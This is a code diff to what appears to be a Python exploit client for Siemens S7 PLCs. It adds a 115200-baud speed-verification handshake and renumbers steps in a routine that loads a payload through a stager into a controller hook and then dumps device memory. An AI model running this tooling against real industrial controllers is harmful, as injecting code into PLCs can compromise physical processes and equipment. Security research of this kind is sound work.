@@ -233,6 +233,18 @@ class SiemensS7Client:
         log.success("Switched to 115200 baud.")
         return True
 
+    def verify_turbo_speed(self):
+        log.info("Verifying communication at 115200 baud...")
+        log.info("Sending speed verification (0xCC)...")
+        self.r.send('\xcc')
+        log.info("Waiting for confirmation (0xDD)...")
+        confirmation = self.r.recv(1)
+        if confirmation != '\xdd':
+            log.error("Did not receive speed confirmation. Got {} instead.".format(hexlify(confirmation)))
+            return False
+        log.success("Speed verification successful. Communication at 115200 baud confirmed.")
+        return True
+
     def load_payload_turbo(self, payload, dest_addr):
         log.info("Sending destination address: 0x{:08x}".format(dest_addr))
         self.r.send(struct.pack('>I', dest_addr))
@@ -289,13 +301,18 @@ class SiemensS7Client:
                 self.bye()
                 return
             
-            # Step 4: Send the dump_mem payload via turbo mode
+            # Step 4: Verify communication at 115200 baud (send 0xCC, receive 0xDD)
+            if not self.verify_turbo_speed():
+                self.bye()
+                return
+            
+            # Step 5: Send the dump_mem payload via turbo mode
             # The turbo_stager will receive it, install it at hook 0x1a, and send 'D'
             if not self.load_payload_turbo(payload, dump_payload_addr):
                 self.bye()
                 return
             
-            # Step 5: Dump memory using the payload installed by turbo_stager at hook 0x1a
+            # Step 6: Dump memory using the payload installed by turbo_stager at hook 0x1a
             log.info("Dumping memory...")
             contents = self.payload_dump_mem(args.address, args.length, DEFAULT_SECOND_ADD_HOOK_IND)
         else:
